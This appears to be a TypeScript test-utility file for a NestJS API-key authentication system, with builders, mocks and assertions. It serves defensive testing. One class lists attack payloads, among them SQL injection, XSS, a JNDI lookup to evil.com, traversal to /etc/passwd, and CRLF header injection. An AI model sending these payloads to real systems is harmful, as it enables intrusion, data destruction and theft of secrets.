import { randomBytes, createHash } from 'crypto';
import { randomUUID } from 'crypto';
import { ExecutionContext } from '@nestjs/common';
import { Reflector } from '@nestjs/core';

// Import entities and types
import { ApiKey, ApiKeyRateLimit } from '../modules/auth/entities/api-key.entity';
import { 
  SecurityAuditLog, 
  SecurityEventType, 
  SecurityEventMetadata 
} from '../modules/auth/entities/security-audit.entity';
import { 
  CreateApiKeyRequest, 
  ApiKeyValidationResult 
} from '../modules/auth/services/secure-api-key.service';
import { AuthenticatedRequest } from '../modules/auth/guards/secure-api-key.guard';

/**
 * Security-focused test data builder for API key authentication system
 */
export class SecurityTestDataBuilder {
  /**
   * Generate a cryptographically secure API key for testing
   */
  static generateSecureApiKey(): string {
    const keyBytes = randomBytes(32);
    return keyBytes
      .toString('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
  }

  /**
   * Hash an API key using the same method as CryptoService
   */
  static hashApiKey(apiKey: string): string {
    const hash = createHash('sha256');
    hash.update(apiKey);
    return hash.digest('hex');
  }

  /**
   * Create a complete valid API key entity with all security fields
   */
  static createValidApiKey(overrides: Partial<ApiKey> = {}): ApiKey {
    const plainTextKey = this.generateSecureApiKey();
    const hashedKey = this.hashApiKey(plainTextKey);

    const entity = new ApiKey();
    entity.id = overrides.id || randomUUID();
    entity.hashedKey = overrides.hashedKey || hashedKey;
    entity.name = overrides.name || 'Test Security Key';
    entity.scopes = overrides.scopes || ['notifications:create', 'notifications:read'];
    entity.rateLimit = overrides.rateLimit || { hourly: 1000, daily: 10000 };
    entity.isActive = overrides.isActive ?? true;
    entity.lastUsedAt = overrides.lastUsedAt || null;
    entity.expiresAt = overrides.expiresAt || null;
    entity.organizationId = overrides.organizationId || 'test-org-123';
    entity.createdByUserId = overrides.createdByUserId || 'test-user-456';
    entity.createdAt = overrides.createdAt || new Date();
    entity.updatedAt = overrides.updatedAt || new Date();

    // Add methods
    entity.isExpired = jest.fn().mockReturnValue(
      overrides.expiresAt ? new Date() > overrides.expiresAt : false
    );
    entity.hasScope = jest.fn().mockImplementation((scope: string) => 
      entity.scopes.includes(scope)
    );
    entity.canPerformOperation = jest.fn().mockImplementation((operation: string) =>
      entity.isActive && !entity.isExpired() && entity.hasScope(operation)
    );

    return entity as ApiKey;
  }

  /**
   * Create an expired API key for testing expired key scenarios
   */
  static createExpiredApiKey(overrides: Partial<ApiKey> = {}): ApiKey {
    const expiredDate = new Date(Date.now() - 86400000); // 24 hours ago
    return this.createValidApiKey({
      ...overrides,
      expiresAt: expiredDate,
    });
  }

  /**
   * Create an inactive API key for testing deactivated key scenarios
   */
  static createInactiveApiKey(overrides: Partial<ApiKey> = {}): ApiKey {
    return this.createValidApiKey({
      ...overrides,
      isActive: false,
    });
  }

  /**
   * Create API key with specific scopes for authorization testing
   */
  static createApiKeyWithScopes(scopes: string[], overrides: Partial<ApiKey> = {}): ApiKey {
    return this.createValidApiKey({
      ...overrides,
      scopes,
    });
  }

  /**
   * Create API key with custom rate limits for rate limiting tests
   */
  static createApiKeyWithRateLimit(rateLimit: ApiKeyRateLimit, overrides: Partial<ApiKey> = {}): ApiKey {
    return this.createValidApiKey({
      ...overrides,
      rateLimit,
    });
  }

  /**
   * Create CreateApiKeyRequest for testing key creation
   */
  static createApiKeyRequest(overrides: Partial<CreateApiKeyRequest> = {}): CreateApiKeyRequest {
    return {
      name: overrides.name || 'Test API Key Request',
      scopes: overrides.scopes || ['notifications:create'],
      rateLimit: overrides.rateLimit || { hourly: 100, daily: 1000 },
      expiresAt: overrides.expiresAt,
      organizationId: overrides.organizationId || 'test-org-123',
      createdByUserId: overrides.createdByUserId || 'test-user-456',
    };
  }

  /**
   * Create ApiKeyValidationResult for mocking validation responses
   */
  static createValidationResult(
    valid: boolean,
    overrides: Partial<ApiKeyValidationResult> = {}
  ): ApiKeyValidationResult {
    const result: ApiKeyValidationResult = {
      valid,
      reason: overrides.reason,
      rateLimitInfo: overrides.rateLimitInfo,
    };

    if (valid && !overrides.apiKey) {
      result.apiKey = this.createValidApiKey();
    } else if (overrides.apiKey) {
      result.apiKey = overrides.apiKey;
    }

    return result;
  }

  /**
   * Create SecurityAuditLog for testing audit functionality
   */
  static createSecurityAuditLog(
    eventType: SecurityEventType,
    overrides: Partial<SecurityAuditLog> = {}
  ): SecurityAuditLog {
    const log = new SecurityAuditLog();
    log.id = overrides.id || randomUUID();
    log.eventType = eventType;
    log.apiKeyId = overrides.apiKeyId || randomUUID();
    log.hashedKey = overrides.hashedKey || null;
    log.ipAddress = overrides.ipAddress || '192.168.1.100';
    log.userAgent = overrides.userAgent || 'TestAgent/1.0';
    log.requestId = overrides.requestId || 'req_test_12345';
    log.organizationId = overrides.organizationId || 'test-org-123';
    log.metadata = overrides.metadata || {};
    log.message = overrides.message || `Test ${eventType} event`;
    log.timestamp = overrides.timestamp || new Date();

    return log;
  }

  /**
   * Create multiple API keys for bulk testing scenarios
   */
  static createMultipleApiKeys(
    count: number,
    factory?: (index: number) => Partial<ApiKey>
  ): ApiKey[] {
    return Array.from({ length: count }, (_, index) => {
      const overrides = factory ? factory(index) : {};
      return this.createValidApiKey({
        name: `Test Key ${index}`,
        organizationId: `org-${index % 3}`, // Distribute across orgs
        ...overrides,
      });
    });
  }
}

/**
 * Mock factory for security-related services with realistic behavior
 */
export class SecurityMockFactory {
  /**
   * Create a mock CryptoService with realistic implementations
   */
  static createMockCryptoService() {
    return {
      generateApiKey: jest.fn(() => SecurityTestDataBuilder.generateSecureApiKey()),
      hashApiKey: jest.fn(async (key: string) => SecurityTestDataBuilder.hashApiKey(key)),
      compareHashes: jest.fn((hash1: string, hash2: string) => hash1 === hash2),
      isValidApiKeyFormat: jest.fn((key: string) => {
        return /^[A-Za-z0-9_-]{43}$/.test(key);
      }),
      hashString: jest.fn((input: string) => SecurityTestDataBuilder.hashApiKey(input)),
      generateSecureRandom: jest.fn((length: number = 32) => 
        randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length)
      ),
      generateSalt: jest.fn(() => randomBytes(32).toString('hex')),
    };
  }

  /**
   * Create a mock SecurityAuditService with tracking capabilities
   */
  static createMockSecurityAuditService() {
    const auditEvents: any[] = [];

    return {
      logSecurityEvent: jest.fn(async (eventData: any) => {
        auditEvents.push(eventData);
      }),
      logApiKeyUsed: jest.fn(async (...args: any[]) => {
        auditEvents.push({ type: 'API_KEY_USED', args });
      }),
      logInvalidApiKeyAttempt: jest.fn(async (...args: any[]) => {
        auditEvents.push({ type: 'INVALID_API_KEY_ATTEMPT', args });
      }),
      logRateLimitExceeded: jest.fn(async (...args: any[]) => {
        auditEvents.push({ type: 'RATE_LIMIT_EXCEEDED', args });
      }),
      logApiKeyCreated: jest.fn(async (...args: any[]) => {
        auditEvents.push({ type: 'API_KEY_CREATED', args });
      }),
      logApiKeyDeleted: jest.fn(async (...args: any[]) => {
        auditEvents.push({ type: 'API_KEY_DELETED', args });
      }),
      logExpiredApiKeyAttempt: jest.fn(async (...args: any[]) => {
        auditEvents.push({ type: 'API_KEY_EXPIRED', args });
      }),
      getRecentEvents: jest.fn(async () => []),
      getApiKeyEvents: jest.fn(async () => []),
      getSuspiciousActivity: jest.fn(async () => ({
        invalidAttempts: 0,
        rateLimitExceeded: 0,
        expiredKeyAttempts: 0,
        uniqueIPs: 0,
      })),
      // Helper to access logged events in tests
      getLoggedEvents: () => auditEvents,
      clearLoggedEvents: () => auditEvents.splice(0, auditEvents.length),
    };
  }

  /**
   * Create a mock Redis client with realistic rate limiting behavior
   */
  static createMockRedisClient(options: {
    rateLimitCurrent?: number;
    shouldFail?: boolean;
  } = {}) {
    const { rateLimitCurrent = 50, shouldFail = false } = options;

    const mockClient = {
      get: jest.fn(async (key: string) => {
        if (shouldFail) throw new Error('Redis connection failed');
        return rateLimitCurrent.toString();
      }),
      set: jest.fn(async () => {
        if (shouldFail) throw new Error('Redis connection failed');
        return 'OK';
      }),
      incr: jest.fn(async (key: string) => {
        if (shouldFail) throw new Error('Redis connection failed');
        return rateLimitCurrent + 1;
      }),
      expire: jest.fn(async () => {
        if (shouldFail) throw new Error('Redis connection failed');
        return 1;
      }),
      pipeline: jest.fn(() => ({
        incr: jest.fn(),
        expire: jest.fn(),
        exec: jest.fn(async () => {
          if (shouldFail) throw new Error('Redis pipeline failed');
          return [[null, rateLimitCurrent + 1], [null, 'OK']];
        }),
      })),
    };

    return mockClient;
  }

  /**
   * Create a mock RedisProvider
   */
  static createMockRedisProvider(clientOptions?: any) {
    return {
      getClient: jest.fn(() => this.createMockRedisClient(clientOptions)),
    };
  }

  /**
   * Create a mock SecureApiKeyService with configurable behavior
   */
  static createMockSecureApiKeyService(options: {
    validationResult?: ApiKeyValidationResult;
    shouldThrow?: boolean;
  } = {}) {
    const { validationResult, shouldThrow = false } = options;

    return {
      createApiKey: jest.fn(async (request: CreateApiKeyRequest) => {
        if (shouldThrow) throw new Error('Service error');
        const apiKey = SecurityTestDataBuilder.createValidApiKey({
          name: request.name,
          scopes: request.scopes,
          rateLimit: request.rateLimit,
        });
        return {
          apiKey,
          plainTextKey: SecurityTestDataBuilder.generateSecureApiKey(),
        };
      }),
      validateApiKey: jest.fn(async () => {
        if (shouldThrow) throw new Error('Validation error');
        return validationResult || SecurityTestDataBuilder.createValidationResult(true);
      }),
      deactivateApiKey: jest.fn(async () => {
        if (shouldThrow) throw new Error('Deactivation error');
      }),
      listApiKeys: jest.fn(async () => {
        if (shouldThrow) throw new Error('List error');
        return SecurityTestDataBuilder.createMultipleApiKeys(3);
      }),
      cleanupExpiredKeys: jest.fn(async () => {
        if (shouldThrow) throw new Error('Cleanup error');
        return 5;
      }),
      getUsageStats: jest.fn(async () => {
        if (shouldThrow) throw new Error('Stats error');
        return {
          totalRequests: 1000,
          dailyBreakdown: [
            { date: '2023-01-01', requests: 100 },
            { date: '2023-01-02', requests: 150 },
          ],
        };
      }),
    };
  }
}

/**
 * Security-focused execution context builder for guard testing
 */
export class SecurityExecutionContextBuilder {
  private requireApiKey = true;
  private requiredScope?: string;
  private request: Partial<AuthenticatedRequest> = {};

  static create(): SecurityExecutionContextBuilder {
    return new SecurityExecutionContextBuilder();
  }

  withApiKeyRequired(required: boolean): this {
    this.requireApiKey = required;
    return this;
  }

  withRequiredScope(scope: string): this {
    this.requiredScope = scope;
    return this;
  }

  withApiKey(apiKey: string): this {
    this.request.headers = { ...this.request.headers, 'x-api-key': apiKey };
    return this;
  }

  withBearerToken(token: string): this {
    this.request.headers = { ...this.request.headers, authorization: `Bearer ${token}` };
    return this;
  }

  withQueryApiKey(apiKey: string): this {
    this.request.query = { ...this.request.query, api_key: apiKey };
    return this;
  }

  withIpAddress(ip: string): this {
    (this.request as any).ip = ip;
    return this;
  }

  withUserAgent(userAgent: string): this {
    this.request.headers = { ...this.request.headers, 'user-agent': userAgent };
    return this;
  }

  withForwardedFor(ips: string): this {
    this.request.headers = { ...this.request.headers, 'x-forwarded-for': ips };
    return this;
  }

  withRealIp(ip: string): this {
    this.request.headers = { ...this.request.headers, 'x-real-ip': ip };
    return this;
  }

  withMaliciousHeaders(): this {
    this.request.headers = {
      ...this.request.headers,
      'x-injected': '<script>alert(1)</script>',
      'user-agent': 'Normal-Agent\r\nX-Malicious: evil',
      'x-forwarded-for': '127.0.0.1\r\nHost: evil.com',
    };
    return this;
  }

  withMethod(method: string): this {
    this.request.method = method;
    return this;
  }

  withUrl(url: string): this {
    this.request.url = url;
    return this;
  }

  withRoute(path: string): this {
    this.request.route = { path };
    return this;
  }

  build(reflector?: Reflector): ExecutionContext {
    // Set up default request properties
    const mockRequest: AuthenticatedRequest = {
      headers: {},
      query: {},
      method: 'POST',
      url: '/api/test',
      route: { path: '/api/test' },
      ip: '192.168.1.100',
      ...this.request,
    } as any;

    // Mock reflector if provided
    if (reflector) {
      jest.spyOn(reflector, 'getAllAndOverride')
        .mockReturnValueOnce(this.requireApiKey)
        .mockReturnValueOnce(this.requiredScope);
    }

    return {
      getHandler: jest.fn(),
      getClass: jest.fn(),
      switchToHttp: jest.fn().mockReturnValue({
        getRequest: jest.fn().mockReturnValue(mockRequest),
      }),
    } as any;
  }
}

/**
 * Security attack pattern generators for testing
 */
export class SecurityAttackPatterns {
  /**
   * Generate SQL injection attempts in various API key formats
   */
  static sqlInjectionPatterns(): string[] {
    const baseLength = 43; // Valid API key length
    return [
      "'; DROP TABLE api_keys; --" + 'A'.repeat(baseLength - 26),
      "' OR '1'='1' --" + 'B'.repeat(baseLength - 15),
      "'; UPDATE api_keys SET isActive=true; --" + 'C'.repeat(baseLength - 40),
      "' UNION SELECT * FROM users; --" + 'D'.repeat(baseLength - 32),
      '\x00admin\x00' + 'E'.repeat(baseLength - 8),
    ];
  }

  /**
   * Generate XSS and injection attempts
   */
  static xssInjectionPatterns(): string[] {
    const baseLength = 43;
    return [
      '<script>alert(1)</script>' + 'F'.repeat(baseLength - 25),
      'javascript:alert(1)//' + 'G'.repeat(baseLength - 20),
      '${jndi:ldap://evil.com/a}' + 'H'.repeat(baseLength - 26),
      '<!--#exec cmd="ls"-->' + 'I'.repeat(baseLength - 20),
      '{{7*7}}' + 'J'.repeat(baseLength - 7),
    ];
  }

  /**
   * Generate path traversal attempts
   */
  static pathTraversalPatterns(): string[] {
    const baseLength = 43;
    return [
      '../../../../etc/passwd' + 'K'.repeat(baseLength - 23),
      '..\\..\\windows\\system32\\cmd.exe' + 'L'.repeat(baseLength - 32),
      '/proc/self/environ' + 'M'.repeat(baseLength - 18),
      '\\\\server\\share\\file' + 'N'.repeat(baseLength - 20),
    ];
  }

  /**
   * Generate format string and buffer overflow patterns
   */
  static formatStringPatterns(): string[] {
    return [
      '%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n',
      'AAAAAAAA' + '%08x'.repeat(10),
      '\x41'.repeat(100), // 100 A's
      '\x00'.repeat(50), // 50 null bytes
      'A'.repeat(10000), // Very long string
    ];
  }

  /**
   * Generate Unicode and encoding attack patterns
   */
  static unicodeAttackPatterns(): string[] {
    const baseLength = 43;
    return [
      '\uFEFF' + 'O'.repeat(baseLength - 1), // BOM
      '\u0000admin\u0000' + 'P'.repeat(baseLength - 8), // Unicode nulls
      '\u202E' + 'reversed' + 'Q'.repeat(baseLength - 9), // Right-to-left override
      '\u0009\u000A\u000D\u0020', // Various whitespace
      '🚀💎🔑' + 'R'.repeat(baseLength - 4), // Emojis
    ];
  }

  /**
   * Generate timing attack patterns (keys with systematic differences)
   */
  static timingAttackPatterns(validKey: string): string[] {
    return [
      // Wrong first character
      'Z' + validKey.slice(1),
      // Wrong middle character
      validKey.slice(0, 21) + 'Z' + validKey.slice(22),
      // Wrong last character
      validKey.slice(0, -1) + 'Z',
      // Completely wrong
      'Z'.repeat(validKey.length),
      // Empty
      '',
    ];
  }

  /**
   * Generate brute force attack patterns
   */
  static bruteForcePatterns(): string[] {
    return Array.from({ length: 50 }, (_, i) => {
      // Generate systematic brute force attempts
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
      let result = '';
      let num = i;
      
      for (let j = 0; j < 43; j++) {
        result += chars[num % chars.length];
        num = Math.floor(num / chars.length);
      }
      
      return result;
    });
  }
}

/**
 * Rate limiting test utilities
 */
export class RateLimitTestUtils {
  /**
   * Create rate limit info for testing
   */
  static createRateLimitInfo(
    current: number,
    limit: number = 1000,
    windowMs: number = 3600000
  ) {
    return {
      limit,
      current,
      windowMs,
      resetTime: new Date(Date.now() + windowMs),
    };
  }

  /**
   * Simulate rate limit exceeded scenario
   */
  static createRateLimitExceeded(limit: number = 1000) {
    return this.createRateLimitInfo(limit + 1, limit);
  }

  /**
   * Simulate rate limit within bounds
   */
  static createRateLimitWithinBounds(limit: number = 1000) {
    return this.createRateLimitInfo(Math.floor(limit * 0.8), limit);
  }

  /**
   * Simulate rate limit near threshold
   */
  static createRateLimitNearThreshold(limit: number = 1000) {
    return this.createRateLimitInfo(limit - 1, limit);
  }
}

/**
 * Security assertion helpers for API key tests
 */
export class SecurityAssertions {
  /**
   * Assert that an API key has proper security characteristics
   */
  static assertSecureApiKey(apiKey: string): void {
    expect(apiKey).toBeDefined();
    expect(apiKey).toHaveLength(43);
    expect(apiKey).toMatch(/^[A-Za-z0-9_-]{43}$/);
    expect(apiKey).not.toContain('+');
    expect(apiKey).not.toContain('/');
    expect(apiKey).not.toContain('=');
  }

  /**
   * Assert that a hash is valid SHA-256
   */
  static assertValidHash(hash: string): void {
    expect(hash).toBeDefined();
    expect(hash).toHaveLength(64);
    expect(hash).toMatch(/^[a-f0-9]{64}$/);
  }

  /**
   * Assert that security audit log has all required fields
   */
  static assertSecurityAuditLog(
    log: any,
    eventType: SecurityEventType,
    requiredFields: string[] = []
  ): void {
    expect(log.eventType).toBe(eventType);
    expect(log.timestamp).toBeDefined();
    
    requiredFields.forEach(field => {
      expect(log[field]).toBeDefined();
    });
  }

  /**
   * Assert that API key validation result is secure
   */
  static assertSecureValidationResult(result: ApiKeyValidationResult): void {
    expect(result).toBeDefined();
    expect(result.valid).toBeDefined();
    
    if (result.valid) {
      expect(result.apiKey).toBeDefined();
    } else {
      expect(result.reason).toBeDefined();
    }
  }

  /**
   * Assert that request metadata doesn't contain sensitive information
   */
  static assertNoSensitiveDataInRequest(request: AuthenticatedRequest): void {
    if (request.apiKey) {
      expect(request.apiKey).not.toHaveProperty('hashedKey');
      expect(request.apiKey).not.toHaveProperty('createdAt');
      expect(request.apiKey).not.toHaveProperty('updatedAt');
      expect(request.apiKey).not.toHaveProperty('isActive');
    }
  }

  /**
   * Assert that timing attack protection is working
   */
  static assertTimingAttackProtection(timings: number[]): void {
    const avgTime = timings.reduce((a, b) => a + b, 0) / timings.length;
    const maxDeviation = Math.max(...timings.map(t => Math.abs(t - avgTime)));
    
    // Allow reasonable variance but not too much
    expect(maxDeviation).toBeLessThan(avgTime * 2);
  }

  /**
   * Assert that audit trail is complete
   */
  static assertCompleteAuditTrail(
    auditEvents: any[],
    expectedEventTypes: SecurityEventType[]
  ): void {
    expect(auditEvents.length).toBeGreaterThan(0);
    
    expectedEventTypes.forEach(eventType => {
      const hasEventType = auditEvents.some(event => 
        event.eventType === eventType || event.type === eventType
      );
      expect(hasEventType).toBe(true);
    });
  }
}

/**
 * Performance testing utilities
 */
export class SecurityPerformanceUtils {
  /**
   * Measure execution time of an async function
   */
  static async measureExecutionTime<T>(
    fn: () => Promise<T>
  ): Promise<{ result: T; timeMs: number }> {
    const start = process.hrtime.bigint();
    const result = await fn();
    const end = process.hrtime.bigint();
    const timeMs = Number(end - start) / 1000000;
    
    return { result, timeMs };
  }

  /**
   * Run performance test with multiple iterations
   */
  static async runPerformanceTest<T>(
    fn: () => Promise<T>,
    iterations: number = 100
  ): Promise<{
    results: T[];
    avgTimeMs: number;
    minTimeMs: number;
    maxTimeMs: number;
    totalTimeMs: number;
  }> {
    const measurements: number[] = [];
    const results: T[] = [];
    
    for (let i = 0; i < iterations; i++) {
      const { result, timeMs } = await this.measureExecutionTime(fn);
      measurements.push(timeMs);
      results.push(result);
    }
    
    const totalTimeMs = measurements.reduce((a, b) => a + b, 0);
    const avgTimeMs = totalTimeMs / iterations;
    const minTimeMs = Math.min(...measurements);
    const maxTimeMs = Math.max(...measurements);
    
    return {
      results,
      avgTimeMs,
      minTimeMs,
      maxTimeMs,
      totalTimeMs,
    };
  }

  /**
   * Assert performance is within acceptable bounds
   */
  static assertPerformanceWithinBounds(
    avgTimeMs: number,
    maxAcceptableMs: number,
    operation: string = 'operation'
  ): void {
    expect(avgTimeMs).toBeLessThan(maxAcceptableMs);
    
    if (avgTimeMs > maxAcceptableMs * 0.8) {
      console.warn(
        `Warning: ${operation} performance is ${avgTimeMs.toFixed(2)}ms, ` +
        `approaching limit of ${maxAcceptableMs}ms`
      );
    }
  }
}